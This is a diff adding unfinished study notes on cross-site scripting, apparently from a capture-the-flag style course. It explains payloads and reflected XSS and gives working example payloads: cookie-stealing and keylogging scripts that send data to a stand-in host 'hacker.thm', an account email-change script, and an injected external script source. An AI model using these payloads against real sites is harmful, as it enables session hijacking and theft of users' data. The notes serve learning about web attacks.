@@ -1,0 +1,30 @@
+Cross Site Scripting (XSS): 
+    * Malicious JS is injected into a web app with intention of being exe by other users.
+    * Payload: The JS code we wish to execute on targets computer. Two parts to payload:
+        - Intention:        What the JS should do
+        - Modification:     Circumstancial hanges that need to be made to execute payload. (Always some)
+
+XSS Payloads:
+    Examples of XSS Intention:
+        * Proof of concept. Demonstrates ability to do XSS on a website. JS - <script>alert('XSS');</script> - alert pops up
+        * Session stealing. Targets cookies to steal login tokens. <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+        * Keylogger. Anything typed in webpage will be forwarded to a hackers website. <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+        * Business logic. More specific than ^^^, calls on a resource/ JS fxn to e.g change users email:
+            <script>user.changeEmail('attacker@hacker.thm');</script>       Then hacker just resets password.
+
+Reflected XSS:
+    * Happens when user supplied data in HTTP request is reflected in source code without validation/sanitisation.
+    * example: http://.../?error=invalid input      --Source code--> <p>Invalid input<p>
+    * If application does not check the contents of error parameter, attacker could insert malicious code:
+        - ...?error=<script src="http://badstuff"></script>
+
+    Impact: 
+        - Attacker could send link/ embed it into iframe of another website containing a JS script.
+        - This results in victim executing malicious code, revealing session/ customer info.
+    
+    How to test for Relected XSS?
+        * Test every possible point of entry. Params in URL query string, URL file path, HTTP headers (likely difficult to exploit).
+        * Once you find data being reflected in the web app, need to confirm payload can be ran successfully.
+
+
+NEED TASK 4 notes onwards!
